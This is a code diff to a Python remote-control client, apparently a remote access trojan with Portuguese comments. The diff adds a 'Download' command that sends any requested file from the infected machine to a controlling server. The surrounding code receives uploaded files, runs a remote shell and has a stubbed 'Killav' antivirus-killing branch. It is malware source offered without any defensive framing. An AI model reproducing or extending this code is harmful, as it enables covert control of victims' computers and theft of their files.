@@ -71,10 +71,8 @@ def executa(socket):
             if(not dados): # servidor desconectou, recomeça
                 return
             else:
-                #print(dados)
                 try:
                     if(dados=='1'): # upload
-                        print('recebendo arquivo')
                         l = socket.recv(1024)
                         nome_arquivo = l.split('+/-')[0]
                         print(nome_arquivo)
@@ -86,7 +84,6 @@ def executa(socket):
                             f.write(l)
                             l = socket.recv(1024)
                         f.close()
-                        print('recebido')
 
                     elif(dados=='2'): # shell
                         while True:
@@ -116,7 +113,21 @@ def executa(socket):
                                         socket.send(retorno)
 
                     elif(dados=='3'): # Download
-                        pass
+                        arquivo = socket.recv(1024)
+                        if(os.path.isfile(arquivo)):
+                            socket.send('True')
+                            f = open(arquivo, 'rb')
+                            l = f.read(1024)
+                            while(l):
+                                socket.send(l)
+                                l = f.read(1024)
+                            f.close()
+                            print('envio completo')
+                            socket.shutdown(socket.SHUT_WR)
+                            
+                        else:
+                            socket.send('False')
+
                     elif(dados=='4'): # Killav
                         #kill_antivirus()
                         pass
